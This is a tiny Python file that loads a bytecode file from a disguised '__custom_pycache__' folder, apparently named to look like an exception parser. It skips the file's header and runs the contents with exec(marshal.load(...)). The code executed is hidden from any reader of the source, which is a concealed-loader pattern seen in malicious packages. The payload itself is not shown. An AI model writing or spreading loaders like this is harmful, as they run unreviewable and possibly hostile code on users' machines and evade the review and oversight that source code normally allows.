
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'exception_parser_deb5d055817f4b6dba646abc6ba2bc57.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
